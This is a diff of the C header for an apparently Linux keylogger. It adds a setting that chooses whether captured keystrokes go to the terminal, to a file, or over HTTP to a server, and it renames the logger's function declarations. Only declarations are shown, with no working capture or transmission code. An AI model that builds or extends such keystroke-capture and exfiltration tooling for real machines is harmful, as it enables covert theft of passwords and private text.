@@ -13,6 +13,15 @@
 
 #define DEBUG_MODE 0
 
+/**
+ * @OUT_PUT_METHOD
+ *
+ * 0 - Print in terminal
+ * 1 - Print in file
+ * 2 - Send to server (HTTP)
+*/
+#define OUT_PUT_METHOD 1
+
 typedef struct 
 {
   short unsigned int  inCapsLock ;
@@ -25,10 +34,10 @@ typedef struct
   struct input_event ev;
 } KeyLogger;
 
-KeyLogger *createKeyLogger();
-void mountWord(KeyLogger *keyLogger);
-void analyzeWord(KeyLogger *keyLogger);
-void startKeyLogger(KeyLogger *keyLogger);
-void destroyKeyLogger(KeyLogger *keyLogger);
+KeyLogger *CreateKeyLogger();
+void MountWord(KeyLogger *keyLogger);
+void AnalyzeWord(KeyLogger *keyLogger);
+void StartKeyLogger(KeyLogger *keyLogger);
+void DestroyKeyLogger(KeyLogger *keyLogger);
 
 #endif
